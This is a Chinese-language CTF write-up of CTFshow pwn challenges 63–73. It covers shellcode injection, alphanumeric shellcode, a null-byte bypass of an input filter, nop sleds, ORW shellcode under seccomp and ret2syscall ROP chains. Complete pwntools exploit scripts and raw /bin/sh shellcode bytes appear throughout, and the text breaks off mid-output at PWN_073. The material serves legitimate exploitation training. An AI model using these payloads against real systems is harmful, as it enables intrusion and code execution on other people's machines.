PWN_063\nchecksec，不多说：\nIDA64：\n这次更狠了，read只读取55长度了\u0026hellip;\n还是这个网站，找一个23字节的shellcode😄。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28183) io.recvuntil(\u0026#39;[\u0026#39;) buf_addr = io.recvuntil(\u0026#39;]\u0026#39;, drop = True) buf_address = int(buf_addr, 16) shellcode_x64 = \u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34; #https://www.exploit-db.com/exploits/36858 payload = cyclic(0x10+8) + p64(buf_address+32) + shellcode_x64 io.sendline(payload) io.recv() io.interactive() 建议可以把一些长度较短的shellcode保存到桌面，下次遇到断网的线下赛就可以直接套用了。\nPWN_064 题目：有时候开启某种保护并不代表这条路不通。 PWN_064\nchecksec：\nIDA32分析：\n看到一个新函数mmap，mmap（memory map）是 Linux 系统调用，主要功能是将文件或设备映射到进程的虚拟内存空间，但在 PWN 漏洞利用中，更常用其 “匿名映射” 功能，参数通过寄存器传递（rdi, rsi, rdx, r10, r8, r9）\n1 2 3 4 5 // attributes: thunk void *mmap(void *address, size_t len, int prot, int flags, int fd, __off_t offset) { return mmap(address, len, prot, flags, fd, offset); } address（rdi 寄存器）： 期望的内存起始地址，通常设为0（让系统自动分配）。\nlength（rsi 寄存器）： 分配的内存大小（字节），需根据 shellcode 长度设置（如文档中设为0x1000，即 4KB，足够存放 ORW shellcode）。\nprot（rdx 寄存器）： 内存保护属性，PWN 中常用PROT_READ | PROT_WRITE | PROT_EXEC（对应值0x7），表示内存可读、可写、可执行。\nflags（r10 寄存器）： 映射类型标志，漏洞利用中常用MAP_ANONYMOUS | MAP_PRIVATE（对应值0x22）：\nMAP_ANONYMOUS：匿名映射，不关联文件； MAP_PRIVATE：私有映射，修改不影响其他进程。 fd（r8 寄存器）： 文件描述符，匿名映射时设为-1（或0，不影响）。\noffset（r9 寄存器）： 文件偏移量，匿名映射时设为0。\n这行代码使用 mmap 函数分配一块内存区域，将其起始地址保存在变量 buf 中。 mmap 函数通常用于在内存中分配一块连续的地址空间，并指定相应的权限和属性。\n这里buf用mmap映射了地址，可读可写可执行，直接传入shellcode，((void (*)(void))buf)()。调用了buf，运行shellcode 即可获取shell。\n那我们完全可以用pwntools的shellcraft模块下的shellcode（29字节长度）\nexp:\n1 2 3 4 5 6 7 8 from pwn import * context(arch = \u0026#39;i386\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28163) shellcode = asm(shellcraft.sh()) io.sendline(shellcode) io.recv() io.interactive() PWN_065 题目：你是一个好人。 PWN_065\nchecksec：\n居然开了RELRO完全保护。\n运行下看看：\n可以发现这里要我们输入一个符合要求的字符串才行。\nIDA64看不了源码，只能看汇编代码：\n在这里我们看到我们输入的字符经read函数读取然后通过jg比较是var_8否大于零，符合要求就跳转到loc_11AC\ncdqe使用eax的最高位拓展rax高32位的所有位 movzx则是按无符号数传送+扩展（16-32） EAX是32位的寄存器，而AX是EAX的低16位,AH是ax的高8位，而AL是ax的低8位大致就是将我们输入的字符串每一位进行比较，如果不在0x60~0x7A这个范围就跳转剩下几个就是跳转的范围。\n意思可能就是从第一个字符开始一直做循环判断，如果每一个字符都在一定区间，结束最后一个字符判断时就能够绕过上面的 loc_11B8 来执行 shellcode 了。\n1.第一组范围标识：允许 0x60~0x7A（对应 ASCII \u0026lsquo;`\u0026rsquo;~\u0026lsquo;z\u0026rsquo;）\n对应代码段（loc_11B8至loc_1236）：\n1 2 3 4 .text:00000000000011C5 cmp al, 60h ; \u0026#39;`\u0026#39; // 边界1：0x60 .text:00000000000011C7 jle short loc_11DA // 字符≤0x60 → 进入下一轮校验 .text:00000000000011D6 cmp al, 7Ah ; \u0026#39;z\u0026#39; // 边界2：0x7A .text:00000000000011D8 jle short loc_1236 // 字符≤0x7A → 通过校验 2.第二组范围标识：允许 0x40~0x5A（对应 ASCII \u0026lsquo;@\u0026rsquo;~\u0026lsquo;Z\u0026rsquo;）\n对应代码段（loc_11DA至loc_1236）：\n1 2 3 4 .text:00000000000011E7 cmp al, 40h ; \u0026#39;@\u0026#39; // 边界1：0x40 .text:00000000000011E9 jle short loc_11FC // 字符≤0x40 → 进入下一轮校验 .text:00000000000011F8 cmp al, 5Ah ; \u0026#39;Z\u0026#39; // 边界2：0x5A .text:00000000000011FA jle short loc_1236 // 字符≤0x5A → 通过校验 3.第三组范围标识：允许 0x2F~0x3F（对应 ASCII \u0026lsquo;/\u0026rsquo;~\u0026rsquo;?\u0026rsquo;）\n对应代码段（loc_11FC至loc_1236）：\n1 2 3 4 .text:0000000000001209 cmp al, 2Fh ; \u0026#39;/\u0026#39; // 边界1：0x2F .text:000000000000120B jle short loc_121E // 字符≤0x2F → 错误（退出） .text:000000000000121A cmp al, 5Ah ; \u0026#39;Z\u0026#39; // 边界2：0x5A .text:000000000000121C jle short loc_1236 // 字符≤0x5A → 通过校验 综上：这段汇编通过 cmp al, 60h、cmp al, 7Ah、cmp al, 40h、cmp al, 5Ah、cmp al, 2Fh 这 5 处cmp指令，明确标识了输入字符的允许范围（0x2F~0x5A 或 0x60~0x7A）。其实就是要我们输入的字符都是可打印字符，shellcode 有些是不可打印字符，这个叫string.printable，就是可见字shellcode。这里使用alpha3就可以生成了:\n1 git clone https://github.com/TaQini/alpha3.git 刚好pwntools的shellcode是有不可打印的字符：\n1 2 3 from pwn import * shellcode = asm(shellcraft.sh()) print(shellcode) jhh///sh/bin\\x89�h\u0001\u0001\u0001\u0001\\x814$ri\u0001\u00011�Qj\\x04\u0001�Q��1�j\\x0b̀\n将shellcode重定向到一个文件中 切换到alpha3目录中，使用alpha3生成string.printable:\n1 2 3 cd alpha3 python ./ALPHA3.py x64 ascii mixedcase rax --input=\u0026#34;存储shellcode的文件\u0026#34; \u0026gt; 输出 文件 把输出的shellcode可见字符串粘贴到exp上的变量。\nexp:\n1 2 3 4 5 6 7 8 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28125) io.recvuntil(\u0026#34;Shellcode\u0026#34;) shellcode = \u0026#34;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\u0026#34; io.send(shellcode) io.interactive() PWN_066 题目：简单的shellcode？不对劲，十分得有十二分的不对劲。 PWN_066\nchecksec、IDA64分析：\n看到了熟悉的mmap函数；buf存在溢出点，往buf里写入shellcode，然后程序会执行shellcod但是有一个check函数，跟进查看：\ncheck函数的作用是：验证输入字符串a1中的每个字符是否都属于unk_400F20指向的允许字符集。\n继续跟进unk_400F20：\n我们输入的shellcode的每一位字符要在unk_400F20中，检查的时候*j==0会退出，可以使用\\x00来突破程序队shellcode的字符白名单校验；而常规的shellcraft.sh()生成的 shellcode 包含大量白名单外字符（如\\x3b、\\x0f等），无法直接通过校验，因此必须绕过。\n如何绕过从check函数下手：\n看到这里你会发现while里面是一个a1参数，如果我让a1 == 0，while的循环条件不成立，直接退出循环。\n所以exp：\n1 2 3 4 5 6 7 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28280) shellcode = \u0026#39;\\x00\\xc0\u0026#39; + asm(shellcraft.sh()) io.sendline(shellcode) io.interactive() \\x00\\xc0是 **“截断校验 + 合法执行” 的双重工具 **：\\x00负责突破check函数的逐字节白名单限制，\\xc0负责确保指令合法以避免执行错误，二者组合是该题目绕过字符合法性校验、成功执行 shellcode 的核心关键。\nnop sled空操作雪橇 “nop”（No Operation 的缩写）：是一条汇编指令，在 32 位 x86 架构下，其机器码为0x90。nop 指令执行时，CPU 不进行实际的运算或数据处理操作，仅将程序计数器（如 32 位架构下的 EIP 寄存器）的值增加 1，指向下一条指令，起到占位和使程序流程顺序执行的作用。\n“sled”（雪橇）：形象地描述了攻击原理。通过在 shellcode 前面填充大量的 nop 指令，形成一个 “指令雪橇”。当程序的执行流被劫持到这个 “雪橇” 区域内的任意位置时，就像雪橇从高处滑下一样，程序会顺着一个个 nop 指令依次执行，最终到达并执行位于 “雪橇” 后方的 shellcode。这一过程可类比为在不确定 shellcode 确切起始地址的情况下，扩大可命中的范围，只要返回地址能落入 nop 指令组成的区域，就能保证 shellcode 被执行。\nPWN_067*（待定） 题目：32bit nop sled； PWN_067\nchecksec：\n这次只有栈溢出保护了。\nIDA32分析：\n这个v5地址被打印输出，但一直是动态变化的。\n代码的大概意思是先输出一些信息，然后输出的会有栈中的地址，从query_position函数可以发现函数返回值是v1的地址加上v2的值，而v1是局部变量，那么它的地址就是栈里的地址，加上v2就代表接收函数返回值的变量position=v1的地址+v2的值(即\u0026amp;v1+v2)。然后程序会让我们输入大小为4096的字符串给seed变量，之后再让我们输入一个地址，将其赋给v5，然后使用v5从我们输入的这个地址执行这个地址的代码。\n因此我们可以从堆栈中执行。向程序提供 shellcode 很容易，因为它只要求输入。现在我们只需要找到一种方法来跳转到我们的 shellcode。\n刚好有个 fgets 可以读取 shellcode 到 seed，但是我们并不知道 seed 的地址。\n跟进query_position函数：\nchar *query_position() 作用是生成一个基于随机偏移的栈地址，得到一个范围在-668到 668之间的随机整数，并将其存储在变量 v2 中。该地址后续用于构造 “nop 雪橇” 攻击以绕过栈地址随机性。\n看到这里就有点印象了，这不就是类似ASLR（Address Space Layout Randomization）保护吗？\n我们这里需要了解一下 nop sled 空操作雪橇：\n攻击者通过输入字符串注入攻击代码。在实际的攻击代码前注入很长的 nop 指令（无操作，仅使程序计数器加一）序列，只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址，并执行。由于栈地址在一定范围的随机性，攻击者不能够知道攻击代码注入的地址，而要执行攻击代码需要将函数的返回地址更改为攻击代码的地址（可通过缓冲区溢出的方式改写函数返回地址）。所以，只能在一定范围内（栈随机导致攻击代码地址一定范围内随机）枚举攻击代码位置（有依据的猜） 。\n不用 nop sled ， 函数返回地址 \u0026mdash;\u0026mdash;-\u0026gt; 攻击代码。\n使用 nop sled ， 函数返回地址 \u0026mdash;\u0026mdash;-\u0026gt; nop 序列（顺序执行） 直到攻击代码地址。\n为了安全地“绕过”不知道缓冲区的确切开始位置,我们可以：\n1、将 shellcode 填充为以 1336 nop 条指令开头 ( 0x90 )。\n2、使用 的返回值 query_position ，添加 0x2d （如前所述），然后添加 668。\npython3运行的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * context.arch = \u0026#34;i386\u0026#34; context.log_level = \u0026#34;debug\u0026#34; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28120) io.recvuntil(\u0026#34;current location: \u0026#34;) addr = eval(io.recvuntil(\u0026#34;\\n\u0026#34;,drop=True)) print(hex(addr)) payload = b\u0026#39;\\x90\u0026#39; * 1336 + asm(shellcraft.sh()) io.recvuntil(\u0026#34;\u0026gt; \u0026#34;) io.sendline(payload) # 输进v5的地址 shell_addr = addr + 0x2d + 668 io.recvuntil(\u0026#34;\u0026gt; \u0026#34;) io.sendline(hex(shell_addr)) io.interactive() 在这里特别解释一下：\n1 shell_addr = addr + 0x2d + 668 addr：query_position() 返回的栈地址参考（v1 的地址）；\n+0x2d：补偿栈帧偏移（ 计算得出：0x15 + 4 + 4 + 0x10 = 0x2d），将 “v1 的参考地址” 修正为 “实际 payload 缓冲区（seed 数组）的起始地址”；\n较低地址 ⇒ ⇒ ⇒ 更高地址 stk[ebp-0x15] ebp⇒\u0026lt;旧ebp\u0026gt;[4] \u0026lt;返回地址\u0026gt;[4] padding[0x10] buffer[0x1000] 21 (0x15) + 4 + 4 + 16 (0x10) = 45 字节 （0x2d）\n+668：覆盖程序的最大负偏移（-668），确保跳转地址落入 1336 个 nop 的范围内（无论随机偏移如何波动，地址都能命中 nop 序列）。\n看回*query_position函数：\n可以看到v1在query_position函数ebp-0x15的位置。\n————参考CTFshow-pwn入门-pwn67(nop sled空操作雪橇)-CSDN博客\n在这里我想说的是nop sled 并非专门用于突破 ASLR 保护，其核心作用是 “扩大 shellcode 的可命中地址范围”，可用于应对多种导致 “shellcode 地址不确定” 的场景，ASLR 保护只是其中一种。\nASLR（地址空间布局随机化）的核心是让程序的栈、堆、库等内存区域的起始地址每次运行时随机变化（ PWN_061、PWN_062 等题目开启 PIE，本质是 ASLR 的延伸），导致攻击者无法提前确定 shellcode 的精确地址。\nnop sled 的作用是：通过在 shellcode 前填充大量\\x90（nop 指令），形成一个 “指令序列区域”—— 只要程序执行流跳转到该区域的任意位置，都会顺着 nop 指令顺序执行，最终命中后续的 shellcode。\n从这个角度看，nop sled可以用于突破 ASLR 带来的地址随机性，但这并非其唯一用途。\n这题难到我了，对于栈的结构了解不够多，nop、0x2d琢磨很久才明白\u0026hellip;\u0026hellip;等到后续再回来完善一下，如果看不懂就算了。\nPNW_068（待定） 题目：64bit nop sled。 PWN_068\nPWN_069 题目：可以尝试用ORW读flag flag文件位置为/ctfshow_flag。 PWN_069\nchecksec一下：\n64位仅部分开启RELRO，其他保护全关。\nIDA查看main函数（依据函数功能修改对应函数名）：\n复习下mmap函数作用，主要用途有三个：\n1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；\n2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；\n3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。\n把从0x123000开始的地址，大小为0x1000的长度，权限改为可写可执行。\n跟进seccomp函数：\nseccomp主要用于配置和加载 Seccomp（Secure Computing Mode，安全计算模式） 策略，来限制程序可以执行的系统调用，以增强程序的安全性。\nwow这里新大陆\u0026hellip;.沙盒过滤：\n1 seccomp-tools dump ./pwn 只有read，write，open，exit可以使用，使用 open\u0026ndash;\u0026gt;read\u0026ndash;\u0026gt;write 这样的orw的方式。\nORW指的是Open-Read-Write技术，是一种利用系统调用读取文件内容（如flag文件）的攻击方法。\nORW通过以下三个系统调用实现：\nopen：打开目标文件，获取文件描述符。\nread：通过文件描述符读取文件内容到缓冲区。\nwrite：将缓冲区的内容写入标准输出。\n跟进ctfshow函数：\n这里有明显的栈溢出漏洞，在上面我提及过mmap函数，在main函数已经执行过一次了，在0x123000这里已经有可写可执行权限了。到这里，攻击思路就比较清晰了，我们想办法往mmap给的这个地址段里面写shellcode(ORW)，然后跳转到这里执行，就OK了。\n那我们的orw_shellcode：\n1 2 3 4 5 mmap = 0x123000 orw_shellcode = shellcraft.open(\u0026#34;/ctfshow_flag\u0026#34;) orw_shellcode = shellcraft.read(3,mmap,0x100)## read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器 orw_shellcode = shellcraft.write(1,mmap,0x100) shellcode = asm(orw_shellcode) shellcode已经编好了，现在编payload让程序听我们话，将shellcode注入进内存中去。\nshellcraft.read的作用是执行read函数的后续流程——读取0x100长度的字符（也就是后续的orw_shellcode），文件描述符fd=3（0、1、2已被标准文件占用）\nshellcraft.write(1, mmap, 0x100) 的 1 是 Linux 标准输出（stdout）的固定文件描述符，其功能是将 mmap 区域中存储的 \\ctfshow_flag 内容输出到屏幕，当成printf也行。\npayload：\n1 2 3 4 jmp_rsp = 0x400a01 payload = asm(shellcraft.read(0, mmap, 0x100)) + asm(\u0026#34;mov rax, 0x123000; jmp rax\u0026#34;) payload = payload.ljust(0x28,b\u0026#39;a\u0026#39;) payload += p64(jmp_rsp) +asm(\u0026#34;sub rsp, 0x30; jmp rsp\u0026#34;) 我在汇编代码分析的过程中找到关键的jmp_rsp后门地址，可以调用这行汇编代码来实现跳转回起始地址：\npayload = asm(shellcraft.read(0, mmap, 0x100)) 的意思是启动read函数，开启“读取模式”处于待读取状态，等待后面的orw_shellcode的出现，并存到mmap的可读可写区域（2+4）；\n最正确理解：执行后因缺少输入数据（orw_shellcode）才进入 “等待状态”。\nasm(\u0026ldquo;mov rax, 0x123000; jmp rax\u0026rdquo;)的意思是跳到mmap=0x123000区域，也就是指向这个区域，等待后续orw_shellcode注入执行。\npayload = asm(shellcraft.read(0, mmap, 0x100)) + asm(\u0026ldquo;mov rax, 0x123000; jmp rax\u0026rdquo;)加起来不足0x28个字节（0x20+8），让buf刚好充满，以便后续将 rsp 调整到 buf 缓冲区起始地址（buf复原）。\npython3的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39; , 28194) mmap = 0x123000 jmp_rsp = 0x400a01 payload = asm(shellcraft.read(0, mmap, 0x100)) + asm(\u0026#34;mov rax, 0x123000; jmp rax\u0026#34;) payload = payload.ljust(0x28,b\u0026#39;a\u0026#39;) payload += p64(jmp_rsp) +asm(\u0026#34;sub rsp, 0x30; jmp rsp\u0026#34;) orw_shellcode = shellcraft.open(\u0026#34;/ctfshow_flag\u0026#34;) + shellcraft.read(3, mmap, 0x100) + shellcraft.write(1, mmap, 0x100) shellcode = asm(orw_shellcode) io.recvuntil(\u0026#39;do\u0026#39;) io.sendline(payload) io.sendline(shellcode) io.interactive() PWN_070 题目：可以开始你的个人秀了 flag文件位置为/flag。 PWN_070\nchecksec：\n64位程序部分开启RELRO，开启栈保护。告诉了我们flag文件位置，hint中还是让我们用ORW读flag。\n具体规则逻辑：\n0000-0001 行：检查程序架构，仅允许 ARCH_X86_64（64 位 x86 架构），否则终止程序（跳转到 0007 行返回 KILL）。 0002 行：将当前系统调用号加载到寄存器 A。 0003-0004 行：过滤 “非标准系统调用”（编号 \u0026gt;= 0x40000000 的内核私有调用），仅允许编号为 0xffffffff 的特殊调用（实际很少用到），其他此类调用会被终止。 0005 行：明确禁止 execve 系统调用（编号 0x3b，用于执行新程序），触发时会终止程序。 0006 行：允许所有未被上述规则禁止的系统调用（返回 ALLOW）。 0007 行：对被禁止的情况，直接终止程序（返回 KILL）。 完全支持**ORW**操作！唯一被禁止的是 execve（执行新程序），但 ORW 操作不依赖它，因此可以正常执行。\n跟进到is_printable函数：\n条件是 a1[i] \u0026lt;= 31 || a1[i] == 127。这意味着如果字符的 ASCII 值小于等于 31，或者等于 127，则认为该字符不可打印。\n可以在开头加上\\x00 \\xc0，做过pwn66，有strlen 的话可以找\\x00开头的shellcode，\\x00 是 ASCII 码为 0 的字符（也叫 空字符），它在 C 语言中唯一的特殊作用是 标记字符串的结束。这里的 \\x00 只是 “告诉 strlen 停止计算”，没有任何 “赋值” 操作（既不修改寄存器，也不修改内存值）。\n这波直接不给看main的C伪代码，只能看汇编语言了。\n我的python3的exp（没用到ORW，巧合）：\n1 2 3 4 5 6 7 8 9 from pwn import * context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28114) shellcode = b\u0026#39;\\x00\\xc0\u0026#39; shellcode += asm(shellcraft.cat(\u0026#34;flag\u0026#34;)) io.recvuntil(\u0026#39;name:\u0026#39;) io.sendline(shellcode) io.interactive() 手写汇编的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #coding:utf-8 from pwn import * context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;amd64\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28114) shellcode = \u0026#39;\u0026#39;\u0026#39; //调用open() push 0 //绕过strlen()检查 mov r15, 0x67616c66 push r15 mov rdi, rsp mov rsi, 0 mov rax, 2 syscall //调用read() mov r14, 3 mov rdi, r14 mov rsi, rsp mov rdx, 0xff mov rax, 0 syscall //调用write() mov rdi,1 mov rsi, rsp mov rdx, 0xff mov rax, 1 syscall \u0026#39;\u0026#39;\u0026#39; payload = asm(shellcode) io.sendline(payload) io.interactive() 建议大家在以后要多学学汇编语言，有时候手敲是真的实用，好理解。\nret2syscall ret2syscall的核心思想是通过控制程序的执行流程，使程序执行系统调用（syscall）指令来获取系统资源或执行特定操作。系统调用是操作系统提供给用户程序的接口，用于请求内核服务。例如，在Linux系统中，execve系统调用可以用来启动一个新的程序（如/bin/sh），从而获取shell。\nret2syscall 是通过 拼接程序中的 gadget（指令片段），手动设置系统调用所需的寄存器值，最终触发 int 0x80（32 位 Linux 系统调用入口）来执行命令的攻击方法。\n1.在32位Linux系统中，系统调用通过int 0x80指令触发，需要设置以下寄存器：\neax：系统调用号（例如，execve的调用号为0xb）\nebx：第一个参数（例如，/bin/sh的地址）\necx：第二个参数（通常为0）\nedx：第三个参数（通常为0）\n2.在64位系统中，系统调用通过syscall指令触发，寄存器分配有所不同：\nrax：系统调用号（例如，execve的调用号为0x3b）\nrdi：第一个参数\nrsi：第二个参数\nrdx：第三个参数\nPWN_071 题目：32位的ret2syscall。 PWN_071\nchecksec：\n32位关闭栈保护与PIE。\nIDA32位分析：\n有明显栈溢出漏洞、gets函数；题目描述以及各处都提示了让用ret2syscall来进行攻击，我们可以利用程序中的 gadgets 来获得shell，而对应的 shell 获取则是利用系统调用。\n大致思路是先栈溢出填充缓冲区，利用gadgets调用syscall，也就是传递它的调用号0xb，用rax寄存器传递，然后调用execve函数：\n1 execve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) 需要用到eax系统调用参数传递的寄存器的gadget：\n1 ROPgadget --binary pwn --only \u0026#34;pop|ret\u0026#34;|grep eax execve函数有三个参数，32位架构靠栈传递参数，所以要有参数寄存器：ebx（第 1 参）、ecx（第 2 参）、edx（第 3 参），也就是：\n1 ROPgadget --binary pwn --only \u0026#34;pop|ret\u0026#34;|grep ebx 同理，int 0x80调用号的gadget地址亦是如此：\n/bin/sh的地址：\n同理int 0x80\n我以为的exp\u0026hellip;\u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * from struct import pack context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;i386\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28266) #io = process(\u0026#39;./pwn\u0026#39;) pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 binsh = 0x80BE408 int_0x80 = 0x08049421 payload = cyclic(0x64+4) + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh) + p32(int_0x80) io.sendline(payload) io.interactive() 试半天爆EOF，也是无语，后来才知道想起这个程序是静态编译的，而运行程序是动态的，在IDA上呈现的数据可能是有偏差，这让我想起了缓冲区大小，寄存器esp是动态寄存器，ebp-64h可能是错误的，于是我开始用动态调试pwngdb，既然gets是我们唯一能和程序交互的地方，我们可以通过gets函数，输入一些垃圾值，那就aaaa吧，刚好4字节（建议不要太大，万一溢出了程序就崩溃了，当然aaa、ctf也行），让esp把我所输入的值运走，这会就能看到esp的地址了，然后用ebp地址和它相减得到偏移量了。\n在右边的运行框上，先给程序进行break main指令给main函数断点进行动态调试准备，然后开始了，用n指令（也就是next缩写，一步步进行，左边的调试框也会看到变化），接着回车换行一直进行下一步操作，直到看到有熟悉的ctfshow交互界面和让你输入的交互操作时就可以了：\n这时输入AAAA，左边跟着变化，esp地址出现了。\n查询栈帧底部ebp寄存器地址：\n1 info registers ebp - esp =\u0026gt; 0xffffcf58 - 0xffffceec =\u0026gt; 6C = 108\n这是偏移量，再覆盖ebp本身，那就是112了\n最终exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * from struct import pack context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;i386\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28266) #io = process(\u0026#39;./pwn\u0026#39;) pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 binsh = 0x80BE408 int_0x80 = 0x08049421 payload = cyclic(112) + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh) + p32(int_0x80) io.sendline(payload) io.interactive() 所以说后续看到静态编译一定要多注意偏移量，后续要熟练运用pwngdb动态调试和pwndbg。\nPWN_072 题目：接着练ret2syscall，多系统函数调用。 PWN_072\nchecksec一下：\n32位关闭栈保护与PIE。\nIDA分析，依旧静态编译：\n看到gets函数，和上题差不多，都是利用栈溢出漏洞。\n/bin/sh在IDA上搜索不到，不能返回地址执行getshell了，那就找另外一种方法。确实难找，read衍生函数很多，找到个单纯“read”的函数是真难\u0026hellip;\u0026hellip;\n不会就丢给AI吧，这确实有点难去读懂\u0026hellip;\u0026hellip;\n有read函数那我们可以用它去读取字符串到内存呐，利用read函数来进行手动写入“/bin/sh”字符串。\n在main函数中没看到调用read函数，只能我们写exp时利用syscall去调用read函数，搭配gadgets去让read通过寄存器去读取/bin/sh字符串。可以看到read函数需要三个参数，加上自身系统调用号，我们就需要使用eax、ebx、ecx、edx的gadgets。\ngadget查询：\npop_edx_ecx_ebx_ret：0x0806ecb0\npop_eax_ret：0x080bb2c6\nint 0x80：0x08049421\n调用read函数，read函数系统调用号是0x3，用eax寄存，三个参数用ebx、ecx、edx分别暂时寄存，int 0x80去开启执行read函数，把/bin/sh写入内存bss段后，接着执行execve函数，也是用一样的gadgets：\nread函数的解释：\na1：表示文件描述符（file descriptor），是一个非负整数。在 Linux 系统中，文件描述符是一个指向已打开文件的引用，常见的值有： 0 代表标准输入（stdin）。 1 代表标准输出（stdout）。 2 代表标准错误输出（stderr）。 当打开一个普通文件或其他类型的文件时，系统会分配一个大于 2 的文件描述符。 a2：指向用于存储读取数据的缓冲区的地址。也就是说，从文件描述符 a1 所指向的文件中读取的数据，会被存储到 a2 所指向的内存区域中。 a3：表示要读取的字节数，即指定从文件描述符 a1 所指向的文件中读取多少个字节的数据到 a2 所指向的缓冲区中。 总的来说，read 函数的作用就是从指定的文件描述符所对应的文件中，读取指定字节数的数据到给定的缓冲区中，并且在多线程环境下，对异步取消等情况进行了一定的处理。\n想起上一题，我怕有坑，还特定去用pwngdb调了下，发现真有猫腻：\n这确实和IDA静态分析的偏移量大小不一样，所以下次看到静态编译的程序我直接留一手心眼用pwngdb看一眼偏移量先😄。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * from struct import pack context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;i386\u0026#39;) io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28266) #io = process(\u0026#39;./pwn\u0026#39;) pop_eax_ret = 0x080bb2c6 pop_edx_ecx_ebx_ret = 0x0806ecb0 int_0x80 = 0x0806F350 bss = 0x080eb000 bin_sh = \u0026#34;/bin/sh\\x00\u0026#34; payload = cyclic(44) + p32(pop_eax_ret) + p32(0x3) + p32(pop_edx_ecx_ebx_ret) + p32(0x10) + p32(bss) + p32(0) + p32(int_0x80) payload += p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bss) + p32(int_0x80) io.recvuntil(\u0026#34;system?\u0026#34;) io.sendline(payload) io.sendline(bin_sh) io.interactive() 执行后，程序会阻塞等待用户输入，此时发送 bin_sh = \u0026quot;/bin/sh\\x00\u0026quot;，read 会将该字符串写入 bss 段（0x080eb000 地址处）；\n此时 bss 地址指向的内容就是 \u0026quot;/bin/sh\\x00\u0026quot;，满足 execve 对 “命令路径参数” 的要求。\nPWN_073 题目：愉快的尝试一下一把梭吧！ PWN_073\nchecksec：\n看出来是静态编译了：\nIDA分析main函数：\n还是明显的栈溢出，但是由于是静态编译，我们无法再使用ret2libc来进行getshell，程序中也没有system函数，我们可以尝试直接使用ROPgadget来帮助我们构造一个ROP链：\n1 ROPgadget --binary pwn --ropchain 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 ROP chain generation =========================================================== - Step 1 -- Write-what-where gadgets [+] Gadget found: 0x8051035 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret [+] Gadget found: 0x8048433 pop esi ; ret [+] Gadget found: 0x8048480 pop edi ; ret [-] Can\u0026#39;t find the 